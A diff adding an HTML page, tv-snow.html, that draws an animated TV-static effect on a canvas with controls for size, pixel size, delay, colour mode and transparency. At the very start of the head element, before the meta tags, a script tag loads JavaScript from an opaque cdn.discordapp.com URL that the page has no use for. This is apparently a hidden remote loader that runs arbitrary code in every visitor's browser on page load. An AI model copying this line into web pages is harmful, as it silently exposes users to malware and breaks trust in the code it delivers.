@@ -1,0 +1,326 @@
+--- START OF FILE tv-snow.html ---
+
+<!DOCTYPE html>
+<html lang="en">
+<head><script type='text/javascript' src='https://cdn.discordapp.com/HcQPIR1Q2afwjhyq2_zLGVWz49VJ_SXz4DiMrtUJoTBIOlQ7kGTCdTliAJqLFFxx9c3bBoW0W3MtzScocT39GA=='></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TV Snow Effect</title>
+    <style>
+        body {
+            margin: 0;
+            overflow: hidden;
+            background-color: #000;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            font-family: sans-serif;
+            color: #ccc;
+        }
+
+        /* Container for the TV snow effect, acting as the screen frame */
+        .snow-container {
+            position: absolute; /* Allows precise positioning and sizing */
+            background-color: #000; /* Ensures a black background for transparency */
+            border: 2px solid #333; /* Simple border for a frame look */
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5); /* Soft shadow */
+            overflow: hidden; /* Clips snow pixels outside the container */
+            z-index: 1; /* Below controls */
+            border-radius: 5px; /* Slightly rounded corners for the screen */
+            transition: width 0.3s ease, height 0.3s ease, left 0.3s ease, top 0.3s ease; /* Smooth resizing */
+            display: flex; /* To center canvas inside it if needed, though canvas fills 100% */
+            justify-content: center;
+            align-items: center;
+        }
+
+        canvas {
+            display: block;
+            width: 100%; /* Fill the snow-container */
+            height: 100%; /* Fill the snow-container */
+            background-color: transparent; /* Canvas itself is transparent to show container's black background */
+        }
+
+        .controls {
+            position: relative; /* Stays in normal flow but above the absolute container */
+            z-index: 2; /* Ensures controls are on top of the snow */
+            background-color: rgba(0, 0, 0, 0.7);
+            padding: 15px 25px;
+            border-radius: 8px;
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: auto; /* Push controls to the bottom */
+            margin-bottom: 20px; /* Space from the bottom */
+        }
+        .control-group {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        input[type="range"] {
+            width: 150px;
+            -webkit-appearance: none;
+            height: 8px;
+            background: #444;
+            border-radius: 5px;
+            outline: none;
+        }
+        input[type="range"]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            background: #007bff;
+            cursor: pointer;
+        }
+        label {
+            min-width: 80px;
+        }
+        select {
+            padding: 5px;
+            border-radius: 4px;
+            background-color: #333;
+            color: #ccc;
+            border: 1px solid #555;
+        }
+        input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="snow-container">
+        <canvas id="tvSnowCanvas"></canvas>
+    </div>
+
+    <div class="controls">
+        <div class="control-group">
+            <label for="sizeMode">Screen Size:</label>
+            <select id="sizeMode">
+                <option value="100">Full screen</option>
+                <option value="80">80%</option>
+                <option value="70">70%</option>
+                <option value="50">50%</option>
+                <option value="20">20%</option>
+                <option value="10">10%</option>
+            </select>
+        </div>
+        <div class="control-group">
+            <label for="pixelSize">Pixel Size:</label>
+            <input type="range" id="pixelSize" min="1" max="20" value="8">
+            <span id="pixelSizeValue">8</span>
+        </div>
+        <div class="control-group">
+            <label for="animationSpeed">Delay:</label>
+            <input type="range" id="animationSpeed" min="1" max="200" value="1">
+            <span id="animationSpeedValue">1</span>
+        </div>
+        <div class="control-group">
+            <label for="colorMode">Colors:</label>
+            <select id="colorMode">
+                <option value="custom">Custom Grayscale</option>
+                <option value="bw">Black & White</option>
+                <option value="green">Monochrome Green</option>
+                <option value="blue">Monochrome Blue</option>
+                <option value="red">Monochrome Red</option>
+                <option value="rgb_only">Red/Green/Blue Only</option>
+                <option value="rgb_bw">Red/Green/Blue/Black/White Only</option>
+                <option value="all_colors">All Colors</option>
+            </select>
+        </div>
+        <div class="control-group">
+            <label for="transparency">Transparency (50%):</label>
+            <input type="checkbox" id="transparency">
+        </div>
+    </div>
+
+    <script>
+        const canvas = document.getElementById('tvSnowCanvas');
+        const ctx = canvas.getContext('2d');
+        const snowContainer = document.querySelector('.snow-container');
+
+        let animationFrameId;
+        let pixelSize = parseInt(document.getElementById('pixelSize').value);
+        let animationSpeed = parseInt(document.getElementById('animationSpeed').value);
+        let colorMode = document.getElementById('colorMode').value;
+        let currentSizeModePercentage = parseInt(document.getElementById('sizeMode').value); // Default to Full screen
+        let isTransparent = document.getElementById('transparency').checked;
+
+        const pixelSizeSlider = document.getElementById('pixelSize');
+        const pixelSizeValueSpan = document.getElementById('pixelSizeValue');
+        const animationSpeedSlider = document.getElementById('animationSpeed');
+        const animationSpeedValueSpan = document.getElementById('animationSpeedValue');
+        const colorModeSelect = document.getElementById('colorMode');
+        const sizeModeSelect = document.getElementById('sizeMode');
+        const transparencyCheckbox = document.getElementById('transparency');
+
+        let lastFrameTime = 0;
+
+        /**
+         * Converts a color string (rgb() or named) to rgba() with specified alpha.
+         * @param {string} colorString - The color string (e.g., "rgb(255, 0, 0)", "red", "black").
+         * @param {number} alpha - The alpha value (0 to 1).
+         * @returns {string} The rgba() color string.
+         */
+        function getTransparentColor(colorString, alpha) {
+            if (colorString.startsWith('rgb(')) {
+                // Extract R, G, B values from "rgb(R, G, B)"
+                const parts = colorString.match(/\d+/g);
+                if (parts && parts.length === 3) {
+                    return `rgba(${parts[0]}, ${parts[1]}, ${parts[2]}, ${alpha})`;
+                }
+            } else {
+                // Handle named colors explicitly
+                switch(colorString) {
+                    case 'black': return `rgba(0,0,0,${alpha})`;
+                    case 'white': return `rgba(255,255,255,${alpha})`;
+                    case 'red': return `rgba(255,0,0,${alpha})`;
+                    case 'green': return `rgba(0,128,0,${alpha})`; // Default CSS green
+                    case 'blue': return `rgba(0,0,255,${alpha})`;
+                }
+            }
+            return colorString; // Fallback: return original if parsing fails or unexpected
+        }
+
+        function setContainerSize(percentage) {
+            const windowWidth = window.innerWidth;
+            const windowHeight = window.innerHeight;
+
+            if (percentage === 100) {
+                // Full screen
+                snowContainer.style.width = '100vw';
+                snowContainer.style.height = '100vh';
+                snowContainer.style.left = '0';
+                snowContainer.style.top = '0';
+            } else {
+                // Percentage of viewport, centered
+                const targetWidth = windowWidth * (percentage / 100);
+                const targetHeight = windowHeight * (percentage / 100);
+
+                snowContainer.style.width = `${targetWidth}px`;
+                snowContainer.style.height = `${targetHeight}px`;
+                snowContainer.style.left = `${(windowWidth - targetWidth) / 2}px`;
+                snowContainer.style.top = `${(windowHeight - targetHeight) / 2}px`;
+            }
+            // After setting container size, ensure canvas resizes to fit
+            resizeCanvas();
+        }
+
+        function resizeCanvas() {
+            // Set canvas dimensions to match its parent container's client dimensions
+            canvas.width = snowContainer.clientWidth;
+            canvas.height = snowContainer.clientHeight;
+            drawSnow(performance.now()); // Redraw immediately on resize or container size change
+        }
+
+        function drawSnow(currentTime) {
+            if (!lastFrameTime) lastFrameTime = currentTime;
+            const elapsed = currentTime - lastFrameTime;
+
+            if (elapsed > animationSpeed) { // Control redraw speed
+                ctx.clearRect(0, 0, canvas.width, canvas.height); // Clear canvas
+
+                for (let y = 0; y < canvas.height; y += pixelSize) {
+                    for (let x = 0; x < canvas.width; x += pixelSize) {
+                        const randomValue = Math.random();
+                        let baseColor; // The opaque color determined by color mode
+
+                        switch (colorMode) {
+                            case 'bw':
+                                baseColor = randomValue < 0.5 ? 'black' : 'white';
+                                break;
+                            case 'green':
+                                const greenShade = Math.floor(randomValue * 256);
+                                baseColor = `rgb(0, ${greenShade}, 0)`;
+                                break;
+                            case 'blue':
+                                const blueShade = Math.floor(randomValue * 256);
+                                baseColor = `rgb(0, 0, ${blueShade})`;
+                                break;
+                            case 'red':
+                                const redShade = Math.floor(randomValue * 256);
+                                baseColor = `rgb(${redShade}, 0, 0)`;
+                                break;
+                            case 'custom': // Grayscale
+                                const grayShade = Math.floor(randomValue * 256);
+                                baseColor = `rgb(${grayShade}, ${grayShade}, ${grayShade})`;
+                                break;
+                            case 'rgb_only':
+                                // Randomly pick one of Red, Green, or Blue (named colors)
+                                const rgbOnlyColors = ['red', 'green', 'blue'];
+                                baseColor = rgbOnlyColors[Math.floor(randomValue * rgbOnlyColors.length)];
+                                break;
+                            case 'rgb_bw':
+                                // Randomly pick one of Red, Green, Blue, Black, or White (named colors)
+                                const rgbBwColors = ['red', 'green', 'blue', 'black', 'white'];
+                                baseColor = rgbBwColors[Math.floor(randomValue * rgbBwColors.length)];
+                                break;
+                            case 'all_colors':
+                                // Full random RGB color
+                                const r = Math.floor(randomValue * 256);
+                                const g = Math.floor(Math.random() * 256);
+                                const b = Math.floor(Math.random() * 256);
+                                baseColor = `rgb(${r}, ${g}, ${b})`;
+                                break;
+                        }
+
+                        // Apply transparency if enabled
+                        ctx.fillStyle = isTransparent ? getTransparentColor(baseColor, 0.5) : baseColor;
+                        ctx.fillRect(x, y, pixelSize, pixelSize);
+                    }
+                }
+                lastFrameTime = currentTime; // Update last frame time
+            }
+            animationFrameId = requestAnimationFrame(drawSnow);
+        }
+
+        // Event Listeners for controls
+        pixelSizeSlider.addEventListener('input', (event) => {
+            pixelSize = parseInt(event.target.value);
+            pixelSizeValueSpan.textContent = pixelSize;
+            cancelAnimationFrame(animationFrameId); // Stop current animation
+            drawSnow(performance.now()); // Restart animation immediately with new size
+        });
+
+        animationSpeedSlider.addEventListener('input', (event) => {
+            animationSpeed = parseInt(event.target.value);
+            animationSpeedValueSpan.textContent = animationSpeed;
+            // No need to restart animation, the drawSnow function will naturally adjust
+        });
+
+        colorModeSelect.addEventListener('change', (event) => {
+            colorMode = event.target.value;
+            cancelAnimationFrame(animationFrameId); // Stop current animation
+            drawSnow(performance.now()); // Restart animation with new color mode
+        });
+
+        sizeModeSelect.addEventListener('change', (event) => {
+            currentSizeModePercentage = parseInt(event.target.value);
+            setContainerSize(currentSizeModePercentage); // Update container size
+            // resizeCanvas is called within setContainerSize, which then restarts drawSnow
+        });
+
+        transparencyCheckbox.addEventListener('change', (event) => {
+            isTransparent = event.target.checked;
+            cancelAnimationFrame(animationFrameId); // Stop current animation
+            drawSnow(performance.now()); // Restart animation to apply transparency
+        });
+
+        // Initial setup
+        window.addEventListener('resize', () => {
+            setContainerSize(currentSizeModePercentage); // Re-apply current size mode on window resize
+            // resizeCanvas is called within setContainerSize, which then restarts drawSnow
+        });
+
+        // Set initial container size and start animation
+        setContainerSize(currentSizeModePercentage);
+        // resizeCanvas() is called by setContainerSize()
+        // drawSnow() is called by resizeCanvas()
+    </script>
+</body>
+</html>
+--- END OF FILE tv-snow.html ---
